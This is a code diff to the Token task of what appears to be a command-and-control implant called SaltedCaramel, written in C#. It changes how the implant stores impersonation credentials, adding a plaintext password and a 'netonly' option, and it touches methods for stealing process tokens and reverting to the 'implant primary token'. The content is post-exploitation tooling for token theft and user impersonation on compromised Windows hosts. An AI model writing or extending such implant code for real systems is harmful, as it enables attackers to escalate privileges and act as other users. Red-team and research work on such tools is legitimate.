@@ -10,7 +10,8 @@ namespace SaltedCaramel.Tasks
     public class Token
     {
         public static IntPtr stolenHandle;
-        public static KeyValuePair<string, SecureString> Credentials;
+        public static KeyValuePair<string, KeyValuePair<string, bool>> Credentials;
+        // (username, (password, netonly))
 
         public static void Execute(SCTask task)
         {
@@ -28,16 +29,19 @@ namespace SaltedCaramel.Tasks
         {
             string user = task.@params.Split(' ')[0];
             string pass = task.@params.Split(' ')[1];
-
-            // Dumb workaround, but we have to do this to make a SecureString
-            // out of a string
-            SecureString password = new SecureString();
-            foreach (char c in pass)
+            bool netonly = false;
+            if (task.@params.Split(' ').Length > 2)
             {
-                password.AppendChar(c);
+                if (task.@params.Split(' ')[2] == "netonly")
+                    netonly = true;
             }
 
-            Credentials = new KeyValuePair<string, SecureString>(user, password);
+            Credentials = new KeyValuePair<string, KeyValuePair<string, bool>>(user, new KeyValuePair<string, bool>(pass, netonly));
+
+            task.status = "complete";
+            if (netonly)
+                task.message = $"Impersonated {user} (netonly)";
+            else task.message = $"Impersonated {user}";
         }
 
         public static void StealToken(SCTask task)
@@ -130,7 +134,7 @@ namespace SaltedCaramel.Tasks
             }
             else if (Credentials.Key != null)
             {
-                Credentials = new KeyValuePair<string, SecureString>(null, null);
+                Credentials = new KeyValuePair<string, KeyValuePair<string, bool>>(null, new KeyValuePair<string, bool>(null, false));
             }
         }
 
@@ -143,7 +147,7 @@ namespace SaltedCaramel.Tasks
             }
             else if (Credentials.Key != null)
             {
-                Credentials = new KeyValuePair<string, SecureString>(null, null);
+                Credentials = new KeyValuePair<string, KeyValuePair<string, bool>>(null, new KeyValuePair<string, bool>(null, false));
             }
             task.status = "complete";
             task.message = "Reverted to implant primary token.";
